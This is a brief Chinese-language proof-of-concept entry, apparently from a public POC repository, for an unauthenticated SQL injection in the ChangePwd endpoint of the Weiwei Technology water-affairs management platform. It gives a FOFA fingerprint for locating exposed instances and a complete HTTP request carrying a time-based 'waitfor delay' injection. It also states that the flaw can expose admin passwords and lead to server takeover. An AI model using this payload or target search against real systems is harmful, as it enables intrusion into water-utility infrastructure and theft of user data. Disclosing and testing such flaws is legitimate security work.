## 潍微科技-水务信息管理平台ChangePwd接口存在SQL注入漏洞

潍微科技-水务信息管理平台 ChangePwd 接口存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

## fofa
```
icon_hash="-491165370"
```


## poc
```
GET /Account/ChangePwd?oldpwd=123456&newpwd=123456&conpwd=123456&account=1%27;waitfor%20delay%20%270:0:5%27--+ HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept-Encoding: gzip, deflate, br
Connection: close
```

![a6fd2eeb352ff857001c3613ec992f16](https://github.com/wy876/POC/assets/139549762/db189bee-4a6a-4159-a39f-c07c138e0c59)
